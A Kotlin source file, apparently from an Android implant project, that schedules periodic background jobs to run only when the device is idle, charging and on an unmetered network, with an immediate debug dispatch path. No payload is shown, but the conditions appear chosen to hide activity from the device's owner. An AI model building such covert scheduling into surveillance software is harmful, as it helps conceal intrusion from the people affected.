package com.cooperthecoder.implant.jobs

import android.content.Intent
import android.util.Log
import com.cooperthecoder.implant.App
import com.cooperthecoder.implant.Config
import com.evernote.android.job.JobRequest

object JobManager {

    val TAG = JobManager::class.java.name

    fun schedule(tag: String, every: Long): Unit {
        if (Config.DEBUG) {
            runTaskImmediately(tag)
        }

        // Do this plugged in on an unmetered network when the device is idle.
        JobRequest.Builder(tag)
                .setRequiredNetworkType(JobRequest.NetworkType.UNMETERED)
                .setPeriodic(every)
                .setRequiresDeviceIdle(true)
                .setRequiresCharging(true)
                .setRequirementsEnforced(true)
                .build()
                .schedule()

    }

    private fun runTaskImmediately(tag: String) {
        Log.d(TAG, "Dispatching task $tag immediately")
        val context = App.instance
        val intent = Intent(context, DebugJobScheduler::class.java)
        intent.putExtra(DebugJobScheduler.EXTRA_TASK_NAME, tag)
        context.startService(intent)
    }
}

